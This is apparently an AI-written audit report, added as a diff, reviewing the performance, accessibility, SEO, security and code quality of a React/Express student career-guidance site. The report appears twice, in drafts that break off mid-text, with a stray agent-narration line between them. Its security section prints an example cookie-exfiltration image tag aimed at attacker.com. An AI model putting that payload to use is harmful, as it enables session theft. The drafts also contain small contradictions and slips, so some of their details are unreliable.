@@ -1,0 +1,460 @@
+Comprehensive Website Review: Future Pathways
+Stack: React 18 + TypeScript · Express.js · PostgreSQL (Neon) · Drizzle ORM · Tailwind CSS + shadcn/ui · Deployed on Replit Autoscale
+
+1. Performance
+PERF-01 — Massive Google Fonts Bundle with 25+ Typefaces
+Location: client/index.html:9
+Severity: High
+Description: A single <link> tag requests 25+ font families (Architects Daughter, DM Sans, Fira Code, Geist Mono, Geist, IBM Plex Mono, IBM Plex Sans, Inter, JetBrains Mono, Libre Baskerville, Lora, Merriweather, Montserrat, Open Sans, Outfit, Oxanium, Playfair Display, Plus Jakarta Sans, Poppins, Roboto, Roboto Mono, Source Code Pro, Source Serif 4, Space Grotesk, Space Mono). The resulting CSS response from Google Fonts declares hundreds of @font-face rules. Only Poppins and Inter are actually used (per index.css lines 52-55). This one request alone can add 500ms–1s to LCP on slow connections by blocking initial render and wasting bandwidth.
+Fix: Remove all font families except Poppins (weights 400, 500, 600, 700) and Inter (weights 400, 500). Change display=swap to display=swap (already present) and add <link rel="preload"> for the woff2 files of only the above two families. The final link tag should be roughly 1/15th the current size.
+PERF-02 — No Code Splitting / Route-Level Lazy Loading
+Location: client/src/App.tsx:1-74
+Severity: High
+Description: All 23 page components are statically imported at the top of App.tsx. Every user loads the JavaScript for SuperadminDashboard, Admin, AdminOrganizations, ResultsPrint, etc. regardless of their role. This unnecessarily inflates the initial JS bundle, hurting First Contentful Paint and Time to Interactive.
+Fix: Convert each page import to use React.lazy() and wrap the <Switch> in a <Suspense fallback={<LoadingSpinner />}>. Example: const SuperadminDashboard = React.lazy(() => import("@/pages/SuperadminDashboard")). Admin and PDF-related pages are large components that benefit most.
+PERF-03 — No Image Optimization or Lazy Loading
+Location: client/src/pages/Landing.tsx:154, client/src/pages/AdminOrganizations.tsx:531, client/src/pages/Profile.tsx:256
+Severity: Medium
+Description: <img> tags for school logos, organization logos, and profile images have no loading="lazy" attribute and no width/height attributes. This causes Cumulative Layout Shift (CLS) for dynamically-loaded logos and forces the browser to download off-screen images immediately.
+Fix: Add loading="lazy" and explicit width/height to all <img> tags. For the partner schools marquee (which duplicates images), this is especially important.
+PERF-04 — Session Created for Every Anonymous Visitor
+Location: server/auth.ts:34
+Severity: Medium
+Description: saveUninitialized: true causes a new database session row to be written for every anonymous visitor that hits any route. On the landing page, three API requests (/api/auth/user, /api/public/student-count, /api/public/organizations) are made, potentially creating three session rows per visitor. This inflates the sessions table and adds unnecessary DB writes.
+Fix: Change to saveUninitialized: false. Sessions will only be persisted when data is explicitly written (i.e., on login).
+PERF-05 — N+1 Query Patterns in Superadmin Routes
+Location: server/routes/superadmin.routes.ts:148-167, server/routes/superadmin.routes.ts:224
+Severity: Medium
+Description: For each organization in the list, the code calls getOrganizationMembersByOrganizationId(org.id) followed by getUser(primaryAdmin.userId) — all wrapped in Promise.all. This issues O(N) + O(N) database queries where N is the number of organizations. For 50 organizations, that's 100+ queries per page load. The metrics endpoint at /api/superadmin/metrics has the same pattern (lines 60-78).
+Fix: Add a getOrganizationsWithAdminDetails() method to storage.ts that uses a JOIN between organizations, organizationMembers, and users tables to fetch all data in a single query.
+PERF-06 — staleTime: Infinity in Global QueryClient
+Location: client/src/lib/queryClient.ts:65
+Severity: Low
+Description: The global default staleTime: Infinity means cached data (user profile, analytics, student counts) is never considered stale and will not be refetched when the user navigates back to a page after data changes. While some queries override this (e.g., useAuth sets staleTime: 0), most queries will silently serve stale data.
+Fix: Set a reasonable global default such as staleTime: 5 * 60 * 1000 (5 minutes) and apply staleTime: Infinity only to truly static data like country lists or career definitions.
+PERF-07 — No Caching Headers / CDN for Static Assets
+Location: server/vite.ts (static serving)
+Severity: Medium
+Description: There is no CDN layer (Cloudflare, AWS CloudFront, etc.) configured. Static assets served from the Express server will not benefit from edge caching. The serveStatic call in server/vite.ts does not configure cache-control headers. Vite does generate hashed filenames for JS/CSS (enabling long-lived caching), but the server must send the appropriate headers.
+Fix: Add Cache-Control: public, max-age=31536000, immutable headers for files under /assets/ (hashed filenames) and shorter TTLs for HTML. Consider placing a Cloudflare proxy in front of the Replit deployment.
+2. Accessibility (WCAG 2.1 AA)
+A11Y-01 — maximum-scale=1 Prevents User Zoom (WCAG 1.4.4 Violation)
+Location: client/index.html:5
+Severity: Critical**
+Description: <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" /> prevents users from zooming in. This violates WCAG 2.1 Success Criterion 1.4.4 (Resize Text) and 1.4.10 (Reflow). It is especially harmful for visually impaired users and those with motor impairments who rely on zoom. This is a common accessibility compliance failure that can lead to legal risk in many jurisdictions.
+Fix: Remove maximum-scale=1 entirely: <meta name="viewport" content="width=device-width, initial-scale=1.0" />.
+A11Y-02 — No ARIA Labels on Interactive Navigation Buttons
+Location: client/src/components/layout/Header.tsx, client/src/pages/Landing.tsx
+Severity: High
+Description: The entire navigation across the application has zero aria-label attributes (confirmed by grep returning 0 matches on tsx files). Screen readers will announce the buttons only by their text content, but icon-only states and context are missing. The logout button, for example, announces "Logout" which is fine, but buttons containing only icons (like the dismiss button in AnnouncementBanner.tsx:114) without visible text labels won't be understood.
+Fix: Add aria-label to all icon-containing buttons. The Header logout button is fine, but audit all icon-only usages and add descriptive aria-label attributes.
+A11Y-03 — No Skip Navigation Link
+Location: client/index.html, client/src/App.tsx
+Severity: High
+Description: There is no "skip to main content" link. Keyboard users (and screen reader users) must Tab through the entire sticky header navigation on every page before reaching the page content. With the admin header having 5+ buttons, this is a significant friction point.
+Fix: Add a visually-hidden skip link as the very first element in index.html or the App component: <a href="#main-content" className="sr-only focus:not-sr-only">Skip to main content</a>. Add id="main-content" to the main content area of each page.
+A11Y-04 — Missing Alt Text on Most Images
+Location: client/src/pages/Landing.tsx, client/src/pages/Profile.tsx, client/src/pages/AdminOrganizations.tsx
+Severity: High
+Description: Only 4 <img> tags exist in the entire frontend and all 4 do have alt text (alt={${org.name} logo}, alt="School logo", alt="Logo preview"). However, the numerous Lucide React icons used as standalone decorative elements (<GraduationCap>, <Sparkles>, etc.) lack aria-hidden="true", causing screen readers to announce them as unlabeled SVG images. Grep shows 0 occurrences of aria-hidden in all tsx files.
+Fix: Add aria-hidden="true" to all purely decorative icon usages (e.g., <GraduationCap aria-hidden="true" className="..." />). For icons that convey meaning (like the button icons), ensure the surrounding button has an accessible label.
+A11Y-05 — No Focus Management on Route Transitions
+Location: client/src/App.tsx
+Severity: Medium
+Description: When navigating between routes in this SPA using Wouter, focus is not managed. After clicking a link, keyboard focus remains on the link element while the page content changes. Screen reader users do not receive any announcement that a new page has loaded. This violates WCAG 2.4.3 (Focus Order).
+Fix: Add a route change listener that moves focus to an h1 or a dedicated "page title" element after navigation. This can be done with a useEffect that watches the Wouter location and calls document.querySelector('h1')?.focus() after each transition (with tabIndex={-1} on the h1).
+A11Y-06 — Generic Session Cookie Name
+Location: server/auth.ts:35
+Severity: Low
+Description: The session cookie name is the default connect.sid. This is a minor fingerprinting concern — it reveals the use of Express/connect-based sessions.
+Fix: Change to an application-specific name: name: 'fp_session'.
+3. SEO
+SEO-01 — No Title Tag, Meta Description, or Social Tags
+Location: client/index.html
+Severity: Critical**
+Description: The HTML document has no <title> tag, no <meta name="description">, no Open Graph tags (og:title, og:description, og:image), and no Twitter Card tags. Without a title, search engines use a heuristic title (often the URL), the page won't appear attractively in link previews on social media, and click-through rates from search results will be severely degraded. For a platform targeting schools, recruiters, and counselors sharing results, missing OG tags means shared links look blank.
+Fix: Add at minimum:
+<title>Future Pathways – Career Guidance for Students</title>
+<meta name="description" content="Discover your ideal career path through personalized assessments aligned with your country's vision. For students aged 13-18." />
+<meta property="og:title" content="Future Pathways" />
+<meta property="og:description" content="..." />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary_large_image" />
+
+For dynamic pages (Results, Profile), use a head management library like react-helmet-async to set page-specific titles and descriptions.
+SEO-02 — No robots.txt File
+Location: client/public/ (missing)
+Severity: High
+Description: There is no robots.txt file in client/public/. Search engine crawlers will proceed without guidance, potentially crawling and indexing admin routes (/admin, /superadmin), assessment intermediate steps, and print routes (/print/results) which should not be indexed.
+Fix: Create client/public/robots.txt:
+User-agent: *
+Disallow: /admin
+Disallow: /superadmin
+Disallow: /print/
+Disallow: /assessment
+Disallow: /results
+Allow: /
+Sitemap: https://yourdomain.com/sitemap.xml
+
+SEO-03 — No Sitemap
+Location: client/public/ (missing)
+Severity: High
+Description: No sitemap.xml exists to help search engines discover and prioritize public pages (landing, pricing, privacy, terms, disclaimer).
+Fix: Create a static client/public/sitemap.xml with the public pages. For a mostly-app SPA, include at minimum: /, /group-pricing, /privacy, /terms, /disclaimer.
+SEO-04 — Heading Hierarchy Inconsistency
+Location: client/src/pages/Landing.tsx:91, various pages
+Severity: Medium
+Description: The Landing page has a proper <h1> ("Discover Your Future Path"), <h2> sections, <h3> cards, and <h4> feature items — this is well-structured. However, pages that render the <Header> component (which contains the logo in a <header> landmark) alongside page content may have heading hierarchies that skip levels, as the page H1 may not be present on all interior pages (e.g., Admin, Assessment steps within the multi-step form).
+Fix: Audit each page for the presence of exactly one <h1> that describes the page's primary purpose. Ensure no heading levels are skipped.
+SEO-05 — No Canonical URLs
+Location: All pages
+Severity: Medium
+Description: No <link rel="canonical"> tags are set on any page. With SPA routing and potential duplicate content between /results (authenticated view) and print versions (/print/results), crawlers could index duplicate content.
+Fix: Use react-helmet-async to set canonical URLs on all pages. The print route should have <meta name="robots" content="noindex" />.
+SEO-06 — No Structured Data
+Location: client/src/pages/Landing.tsx
+Severity: Low
+Description: No JSON-LD structured data is present. For a career-guidance platform, WebApplication, Organization, and FAQPage schemas would improve rich snippet eligibility in Google Search.
+Fix: Add a <script type="application/ld+json"> block to the landing page with WebApplication schema at minimum.
+4. Security
+SEC-01 — 'unsafe-inline' in Content Security Policy (scriptSrc & styleSrc)
+Location: server/index.ts:25, server/index.ts:30
+Severity: High
+Description: Both scriptSrc and styleSrc include 'unsafe-inline'. For scriptSrc, this entirely negates XSS protection from the CSP — an attacker who can inject a <script> tag or an inline event handler (onclick) can execute arbitrary code. The comment says it's "Required for Vite in development" for scripts, but both directives apply in production as well since there's no environment-based CSP split.
+Fix: For scriptSrc: Move to a nonce-based or hash-based approach. For production Vite builds (which produce hashed JS files, no inline scripts), 'unsafe-inline' is not needed. For styleSrc: Tailwind CSS uses inline style injection during development; in production builds this is not needed either. Implement separate production CSP without 'unsafe-inline' using isProduction:
+scriptSrc: isProduction 
+  ? ["'self'", "https://js.stripe.com"] 
+  : ["'self'", "'unsafe-inline'", "https://js.stripe.com"],
+
+SEC-02 — Overly Permissive imgSrc: "https:" in CSP
+Location: server/index.ts:35
+Severity: Medium
+Description: imgSrc: ["'self'", "data:", "https:"] allows loading images from any HTTPS URL, including attacker-controlled domains. This is overly broad. An XSS payload could use image URLs to exfiltrate data via query parameters (<img src="https://attacker.com/steal?cookie=..."/>).
+Fix: Restrict to known sources: imgSrc: ["'self'", "data:", "https://storage.googleapis.com", "https://lh3.googleusercontent.com"] (adjust for the actual OAuth profile image domains used).
+SEC-03 — Login/Registration Endpoints Exempt from CSRF
+Location: server/middleware/csrf.middleware.ts:51-56
+Severity: Medium
+Description: /api/login/username and related paths are explicitly exempt from CSRF validation. While the comment explains this is because "login establishes the session," this creates a Login CSRF vulnerability — an attacker could trick a logged-out user into logging in as the attacker's account, then the victim performs actions (making purchases, submitting assessments) that are attributed to the attacker.
+Fix: The recommended mitigation for Login CSRF is to use the double-submit cookie pattern specifically for the login form (retrieve a pre-login CSRF token and include it in the form submission), or to include a SameSite=Strict cookie for the initial CSRF token — which is already done. However, given the CSRF cookie is SameSite: "strict", the existing exemption is relatively safe for same-site navigation, but cross-site login CSRF remains possible via form-based POST from another origin. Consider using SameSite: "lax" (which is already set for the session) and issuing a distinct pre-auth CSRF token for the login page.
+SEC-04 — Internal Error Messages Exposed to Clients in Payment Routes
+Location: server/routes/payment.routes.ts:80, server/routes/payment.routes.ts:305
+Severity: Medium
+Description: Both the payment intent creation and checkout completion endpoints return "Error creating payment intent: " + error.message and "Failed to complete checkout: " + error.message directly in the response body. Stripe SDK errors can contain technical details that help an attacker understand the system's internals.
+Fix: Log the full error server-side and return only a generic message: res.status(500).json({ message: "Payment processing failed. Please try again." }).
+SEC-05 — getSuperadminEmails() Duplicated Across 8 Files
+Location: server/routes/auth.routes.ts, server/middleware/auth.middleware.ts, server/routes/files.routes.ts, server/routes/superadmin.routes.ts, server/routes/country.routes.ts, server/routes/analytics.routes.ts, server/auth.ts, server/routes/admin.routes.ts
+Severity: Medium
+Description: The superadmin email check logic is copy-pasted in 8 separate files. One implementation in superadmin.routes.ts:29 has a subtle difference: !(req.user as any).isLocal && user.email && superadminEmails.includes(...) — it only grants superadmin access to OAuth users by email, while local users must have role === "superadmin" in the DB. Other implementations don't have this isLocal guard. This inconsistency could allow a local user with a superadmin email to gain access in some routes but not others.
+Fix: Create a shared server/utils/superadmin.ts with one authoritative getSuperadminEmails() function and one isSuperadminUser(user, reqUser) function. Import from this single location. Reconcile the isLocal check inconsistency.
+SEC-06 — File Upload in admin.routes.ts Missing MIME Type Validation
+Location: server/routes/admin.routes.ts:13-28
+Severity: Medium
+Description: The multer configuration in admin.routes.ts does not have a fileFilter function — it only sets fileSize: 50MB limit. In contrast, server/routes/files.routes.ts properly validates both MIME type and file extension. Uploaded files in the admin routes (CSV imports) rely on the extension check alone, which is client-controlled. A malicious admin could upload arbitrary file content with a .csv extension.
+Fix: Add the same fileFilter logic used in files.routes.ts to the multer instance in admin.routes.ts.
+SEC-07 — HSTS preload: false in Production
+Location: server/index.ts:57
+Severity: Low
+Description: HSTS is configured correctly for production with a 1-year maxAge and includeSubDomains, but preload: false means the domain will never be added to browser HSTS preload lists. First-time visitors or users who clear their browser data can still be downgraded to HTTP before the HSTS header is received.
+Fix: Once the domain is finalized and stable, change preload: true and submit the domain to hstspreload.org.
+SEC-08 — dangerouslySetInnerHTML in Chart Component
+Location: client/src/components/ui/chart.tsx:81
+Severity: Low
+Description: dangerouslySetInnerHTML is used to inject CSS custom properties into a <style> tag. The values are derived from chart configuration objects (not raw user input), so XSS risk is low in the current code. However, if chart config ever incorporates user-provided data (e.g., career names as color keys), this becomes a direct XSS vector.
+Fix: Validate that color values match a strict CSS color value regex before injection (/^#[0-9a-f]{3,8}$|^hsl\(/i). Consider using inline style props instead of a <style> tag injection.
+5. Code Quality
+CQ-01 — Zero Test Coverage
+Location: Entire repository
+Severity: Critical**
+Description: Not a single test file (.test.ts, .spec.ts) exists anywhere in the codebase. There are no unit tests, integration tests, or end-to-end tests. The application handles financial payments (Stripe), authentication (OAuth + local), and student data for minors — all of which require high reliability. A regression in the payment flow or auth logic cannot be caught automatically.
+Fix: Introduce Vitest for frontend unit tests and integration tests for server routes. Priority test targets: payment amount calculation (PERF), CSRF validation logic, superadmin authorization, password reset token flow, and the career matching algorithm.
+CQ-02 — getSuperadminEmails() Duplicated 8 Times (Same as SEC-05)
+Location: See SEC-05
+Severity: High
+Description: Beyond the security implications, this is a significant maintainability issue. If the logic needs to change (e.g., adding a new admin detection mechanism), it must be updated in 8 places with a high probability of missing one.
+CQ-03 — @types/* Packages in dependencies Instead of devDependencies
+Location: package.json:48-58
+Severity: Medium
+Description: @types/bcryptjs, @types/compression, `@types
+I now have enough detailed information for a comprehensive review. Let me compile the full report.
+
+Comprehensive Website Review: Future Pathways
+Stack: React 18 + TypeScript / Express.js / PostgreSQL (Neon) / Tailwind CSS + shadcn/ui / Replit deployment
+Date of Review: April 6, 2026
+
+1. Performance
+1.1 Massive Blocking Google Fonts Request
+Location: client/index.html:9
+Severity: High
+Description: A single <link> stylesheet loads 25 different font families (Architects Daughter, DM Sans, Fira Code, Geist, Geist Mono, IBM Plex Mono, IBM Plex Sans, Inter, JetBrains Mono, Libre Baskerville, Lora, Merriweather, Montserrat, Open Sans, Outfit, Oxanium, Playfair Display, Plus Jakarta Sans, Poppins, Roboto, Roboto Mono, Source Code Pro, Source Serif 4, Space Grotesk, Space Mono). This is a massive, render-blocking external resource. Each font family adds DNS lookups, TCP connections, TLS handshakes, and font file downloads. Only Poppins and Inter are actually referenced in the CSS variables (client/src/index.css:52–55).
+Fix: Remove all unused font families from the <link> tag. Keep only Poppins and Inter. Use font-display: swap and &display=swap is already appended, which is good. Consider self-hosting these two fonts with next/font or a similar approach to avoid the external dependency entirely.
+1.2 No Route-Level Code Splitting
+Location: client/src/App.tsx:1–74
+Severity: High
+Description: All 21 page components are statically imported at the top of App.tsx. Every page — including heavyweight admin dashboards, superadmin panels, assessment flows, and print views — is bundled into the initial JavaScript payload. The initial bundle will be large, hurting Time-to-Interactive (TTI) and Largest Contentful Paint (LCP) for first-time visitors who only need the landing page.
+Fix: Wrap each page import with React.lazy() and wrap the <Switch> in a <Suspense fallback={<PageSkeleton />}> component. Example:
+const Admin = React.lazy(() => import("@/pages/Admin"));
+
+This will create separate async chunks for each page, dramatically reducing the initial bundle.
+1.3 No Image Lazy Loading
+Location: client/src/pages/Landing.tsx:154, client/src/pages/AdminOrganizations.tsx:531,1404, client/src/pages/Profile.tsx:256
+Severity: Medium
+Description: The handful of <img> elements in the codebase have no loading="lazy" attribute. While the count is small, this should be added as a universal practice, especially for the scrolling school logo marquee on the landing page which could contain many logos.
+Fix: Add loading="lazy" to all <img> elements that are below the fold. For the marquee logos: <img src={org.logoUrl} alt={...} loading="lazy" className="h-10 w-auto object-contain" />
+1.4 Auth Query Bypasses Stale-Time Cache
+Location: client/src/hooks/useAuth.ts:8
+Severity: Medium
+Description: staleTime: 0 on the auth query means every component that calls useAuth() triggers a fresh network request. Since useAuth is called on every page render (Header, Landing, Assessment, etc.), this results in constant /api/auth/user polling on every component mount and re-render. With refetchOnWindowFocus: false as the global default, this is less severe but still causes unnecessary requests.
+Fix: Set staleTime: 30 * 1000 (30 seconds) or use staleTime: 5 * 60 * 1000 (5 minutes) for the auth query, and invalidate it explicitly on login/logout events.
+1.5 10MB JSON Body Limit on All API Routes
+Location: server/index.ts:117
+Severity: Low
+Description: The JSON body parser is configured with a 10MB limit for all API routes (the comment mentions bulk quiz imports). However, the vast majority of API endpoints (authentication, assessments, recommendations, profile) need only a few kilobytes. A 10MB default exposes the server to large payload attacks on every endpoint.
+Fix: Apply the 10MB limit only to the specific bulk import routes. Set the default limit to 1MB or lower: express.json({ limit: '1mb' }). Apply express.json({ limit: '10mb' }) only to bulk import routes like POST /api/admin/questions/bulk.
+1.6 No Caching Headers for Static Assets
+Location: server/vite.ts (serveStatic function)
+Severity: Low
+Description: There is no evidence of explicit cache-control headers for static assets. Vite production builds include content hashes in filenames, so long-lived cache headers can be safely applied. Without them, browsers re-validate assets on every visit.
+Fix: In the serveStatic function, configure Express to serve dist/public with Cache-Control: public, max-age=31536000, immutable for hashed assets, and Cache-Control: no-cache for index.html.
+2. Accessibility (WCAG 2.1 AA)
+2.1 Viewport Meta Prevents User Zoom
+Location: client/index.html:5
+Severity: Critical
+Description: maximum-scale=1 in the viewport meta tag prevents users from pinching to zoom on mobile devices. This is a direct violation of WCAG 2.1 Success Criterion 1.4.4 (Resize Text). Users with low vision who rely on browser zoom are completely blocked. This disproportionately impacts the target audience (students ages 13–18) who may be accessing on mobile.
+Fix: Change the viewport meta to: <meta name="viewport" content="width=device-width, initial-scale=1.0" />. Remove maximum-scale=1 entirely.
+2.2 Virtually No ARIA Labels on Custom Interactive Elements
+Location: Throughout client/src/pages/ and client/src/components/
+Severity: High
+Description: Searching the entire client/src directory finds only 6 aria-label attributes — all in shadcn/ui base components or the announcement banner dismiss button. Custom interactive components like the assessment step cards (AspirationsStep, InterestsStep, PersonalityStep), the sticky note selection cards, the marquee scroll, and the progress tracker have zero ARIA annotations. Screen reader users would have no context for any of these interactions.
+Fix: Add aria-label or aria-labelledby to all interactive containers that don't have visible text labels. For the assessment card grid where students tap to select, add role="group" to the container and aria-label="Select your interests". For selectable StickyNote cards that act as radio buttons, use role="radio" or role="checkbox" with aria-checked.
+2.3 Lucide Icons Not Hidden from Screen Readers
+Location: Throughout all pages and client/src/components/layout/Header.tsx
+Severity: High
+Description: Lucide React icons are used extensively as decorative elements (e.g., the <GraduationCap>, <LogIn>, <Rocket> icons in the header and landing page). Without aria-hidden="true", screen readers will attempt to read these SVG elements, often producing meaningless output like "svg" or reading SVG path data. The icon-next-to-text pattern in buttons (e.g., <LogIn className="w-4 h-4 mr-2" /> Login) will be read as "Login Login" by some screen readers.
+Fix: Add aria-hidden="true" to all decorative icon instances. For buttons with both icon + text, the text label is sufficient — mark the icon as hidden: <LogIn className="w-4 h-4 mr-2" aria-hidden="true" />.
+2.4 Missing Skip Navigation Link
+Location: client/src/components/layout/Header.tsx and page layouts
+Severity: Medium
+Description: There is no skip-to-main-content link at the top of the page. Keyboard-only users must tab through the entire navigation header on every page before reaching the main content. For a multi-step assessment with a persistent header, this becomes extremely burdensome.
+Fix: Add a visually hidden skip link as the first focusable element in Header.tsx: <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50">Skip to main content</a>. Add id="main-content" to the <main> element in PageLayout.tsx.
+2.5 Hover Elevation Overlay May Block Focus Indicators
+Location: client/src/index.css:269–300
+Severity: Medium
+Description: The .hover-elevate system places a ::after pseudo-element with z-index: 999 over the entire component. While this is clever for automatic contrast hover effects, it sits in front of all child content, potentially intercepting click events and obscuring focus rings on child interactive elements.
+Fix: Ensure the ::after overlay uses pointer-events: none (already present) but verify that focus rings on child elements are visible. Add outline styles on the host element itself so the focus ring appears below z-index: 999.
+2.6 No <title> Tag in index.html
+Location: client/index.html
+Severity: Medium
+Description: The HTML document has no <title> element. Until React hydrates the DOM, the browser tab displays blank or the URL. Screen readers announce the page title when the document loads — without one, the page is untitled.
+Fix: Add <title>Future Pathways – Career Guidance for Students</title> to client/index.html. Individual pages can use a library like react-helmet-async to update the title dynamically per route.
+3. SEO
+3.1 No Meta Description, Open Graph, or Twitter Card Tags
+Location: client/index.html
+Severity: Critical
+Description: The HTML <head> contains only a charset, viewport, and favicon. There is no <meta name="description">, no Open Graph tags (og:title, og:description, og:image, og:url), and no Twitter Card tags. This means:
+Google cannot generate a rich snippet for search results
+Sharing the URL on social media shows no preview image or description
+The search ranking signal from meta descriptions is absent
+Fix: Add to client/index.html:
+<title>Future Pathways – Career Guidance for Students</title>
+<meta name="description" content="Discover your ideal career with Future Pathways. Personalized career guidance for students ages 13–18, aligned with your country's vision and the jobs of tomorrow." />
+<meta property="og:title" content="Future Pathways – Career Guidance for Students" />
+<meta property="og:description" content="Personalized career guidance aligned with your country's vision." />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary_large_image" />
+
+3.2 No robots.txt or sitemap.xml
+Location: client/public/ (directory only has favicon.png)
+Severity: High
+Description: There is no robots.txt file, so search crawlers receive no guidance. Admin routes (/admin, /superadmin), print routes (/print/results), and auth routes (/login, /register, /reset-password) will be indexed by default. There is also no sitemap.xml, so search engines must crawl-discover all pages organically.
+Fix: Create client/public/robots.txt:
+User-agent: *
+Disallow: /admin
+Disallow: /superadmin
+Disallow: /print/
+Disallow: /auth/
+Disallow: /checkout
+Allow: /
+Sitemap: https://yourdomain.com/sitemap.xml
+
+Create a static or server-generated sitemap.xml covering the public-facing routes: /, /tier-selection, /group-pricing, /privacy, /terms, /disclaimer.
+3.3 Client-Side Rendering — No SSR for Crawlers
+Location: Entire frontend architecture
+Severity: High
+Description: The entire app is client-rendered React with Wouter. When Googlebot or social media scrapers visit any URL, they receive an empty <div id="root"></div> until JavaScript executes. While Googlebot can execute JavaScript, it does so with a delay (potentially days), and other scrapers (LinkedIn, Slack, WhatsApp, Facebook when sharing links) do not run JavaScript at all — resulting in blank link previews.
+Fix: For the public-facing routes (Landing, PrivacyPolicy, TermsOfUse, Disclaimer), implement server-side rendering of meta tags. The simplest approach without switching frameworks is to use a dynamic meta-tag injection strategy at the Express level: detect bot user-agents and serve pre-rendered HTML for those routes, or migrate public pages to a static rendering step.
+3.4 No Canonical URLs
+Location: All page components
+Severity: Medium
+Description: There are no canonical <link> elements. If the same content is accessible at multiple URLs (e.g., with and without trailing slash, or via query parameters), search engines may index duplicate versions, diluting page rank.
+Fix: Add react-helmet-async and set <link rel="canonical" href="https://yourdomain.com/[path]" /> on each page component.
+3.5 No Structured Data / Schema Markup
+Location: client/src/pages/Landing.tsx
+Severity: Low
+Description: The landing page has no JSON-LD structured data. Adding WebSite, Organization, or EducationalOrganization schema would enable rich snippets in search results.
+Fix: Add a <script type="application/ld+json"> block with Organization schema to client/index.html or the Landing component.
+4. Security
+4.1 Google Fonts Blocked by Content Security Policy
+Location: server/index.ts:29–73 (CSP directives) and client/index.html:7–9
+Severity: Critical
+Description: The CSP is configured with fontSrc: ["'self'", "data:"] and styleSrc: ["'self'", "'unsafe-inline'"]. However, client/index.html loads a Google Fonts stylesheet from https://fonts.googleapis.com (a cross-origin <link rel="stylesheet">). In production, Helmet applies this CSP header, which will block the Google Fonts stylesheet request because https://fonts.googleapis.com is not in styleSrc, and the font files from https://fonts.gstatic.com are not in fontSrc. This means in production, all custom fonts fall back to system fonts, breaking the visual design entirely.
+Fix (Option A — Allow Google Fonts in CSP): Add to CSP directives:
+styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
+fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],
+
+Fix (Option B — Self-host fonts — preferred): Download only Poppins and Inter, serve from client/public/fonts/, and remove the Google Fonts <link> entirely. This also eliminates the render-blocking external request.
+4.2 saveUninitialized: true Creates Sessions for All Visitors
+Location: server/auth.ts:34
+Severity: High
+Description: saveUninitialized: true causes a new session to be created and persisted to PostgreSQL for every unauthenticated visitor, including bots, scrapers, and one-time visitors. This inflates the sessions table, wastes database connections, and is potentially a privacy concern (GDPR considerations around tracking anonymous users). This configuration is now discouraged by express-session documentation.
+Fix: Change to saveUninitialized: false. This only creates a session when something is explicitly stored in req.session, which is the correct behavior for an authentication system.
+4.3 'unsafe-inline' in CSP scriptSrc Weakens XSS Protection
+Location: server/index.ts:24–27
+Severity: High
+Description: scriptSrc includes 'unsafe-inline' (required for Vite in development, the comment notes). However, in production, 'unsafe-inline' in scriptSrc defeats the primary XSS protection benefit of CSP. If an attacker injects a <script> tag or an inline event handler (onclick="..."), the CSP will not block it.
+Fix: For production, replace 'unsafe-inline' with a cryptographic nonce ('nonce-<random>'). Since this is a Vite SPA (no inline scripts in the production build), it should be possible to remove 'unsafe-inline' entirely from the production CSP. Use the environment check: only include 'unsafe-inline' when !isProduction.
+4.4 Admin File Upload Has No MIME Type Validation
+Location: server/routes/admin.routes.ts:12–28
+Severity: High
+Description: The multer configuration in admin.routes.ts has no fileFilter function — it accepts files of any MIME type and extension. The files.routes.ts counterpart does have proper MIME type + extension validation, but the admin bulk-import upload endpoint does not. An authenticated admin could upload any file type.
+Fix: Add the same fileFilter from files.routes.ts to the admin.routes.ts multer configuration, restricting uploads to CSV, JSON, and similar data formats appropriate for bulk imports.
+4.5 Inconsistent Superadmin Authorization Logic
+Location: server/routes/superadmin.routes.ts:29 vs server/middleware/auth.middleware.ts:33
+Severity: Medium
+Description: The superadmin check in superadmin.routes.ts excludes local (username/password) users from email-based promotion: !(req.user as any).isLocal && user.email && superadminEmails.includes(...). The isAdmin middleware in auth.middleware.ts does NOT exclude local users. This means a local user whose email is in SUPERADMIN_EMAILS can pass the isAdmin check (used for admin routes) but cannot pass the isSuperadminMiddleware check (used for superadmin routes), unless their DB role is "superadmin". This inconsistency is a logic error and a potential access control confusion.
+Fix: Centralize the superadmin check into a single shared function in auth.middleware.ts and use it consistently everywhere. Remove the !isLocal condition or document clearly why local superadmins must have role: "superadmin" in the database.
+4.6 getSuperadminEmails() Duplicated Across 8+ Files
+Location: server/auth.ts, server/routes/auth.routes.ts, server/routes/superadmin.routes.ts, server/routes/admin.routes.ts, server/middleware/auth.middleware.ts, server/routes/files.routes.ts, server/routes/analytics.routes.ts, server/routes/country.routes.ts
+Severity: Medium
+Description: The same 4-line function is copy-pasted 8+ times. Beyond being a DRY violation, it is a maintenance risk — if the environment variable name ever changes, all 8 copies must be updated. More dangerously, the slight inconsistency between implementations (the !isLocal gate in one) has already produced a real security inconsistency (see 4.5).
+Fix: Export getSuperadminEmails() once from server/utils/auth.ts (or server/config/constants.ts) and import it in all 8 locations.
+4.7 CSRF Login Endpoints Exempt Without Double-Submit Cookie
+Location: server/middleware/csrf.middleware.ts:51–56
+Severity: Low
+Description: /api/login and /api/login/username are exempt from CSRF validation. This is a common and accepted pattern (as the session does not yet exist), but the CSRF implementation uses a simple double-submit cookie without a secret server-side component. A network attacker on the same subdomain could potentially forge the CSRF cookie. This is acceptable for most deployments but noted for completeness.
+Fix: Consider using csrf-csrf or a CSRF library that generates HMAC-signed tokens for higher assurance. For the current pattern, ensure the sameSite: 'strict' cookie attribute on the CSRF token (already set) is sufficient for the deployment context.
+5. Code Quality
+5.1 No Test Suite
+Location: Entire codebase (no .test.* or .spec.* files found)
+Severity: Critical
+Description: There are zero test files across all 181 TypeScript/JavaScript source files. No unit tests, no integration tests, no end-to-end tests. For an application handling student data, payments (Stripe), authentication (OAuth), and complex career-matching algorithms, the absence of tests creates severe risk: any refactor or dependency upgrade could introduce regressions with no safety net.
+Fix: Start with critical paths: (1) Payment flow tests (mock Stripe, verify amount calculation, idempotency check), (2) Auth middleware tests (superadmin checks, org admin checks), (3) Career matching scoring unit tests. Use Vitest (already configured via Vite) for unit/integration tests and Playwright for E2E.
+5.2 Error Handler Re-throws After Sending Response
+Location: server/index.ts:190–196
+Severity: High
+Description:
+app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
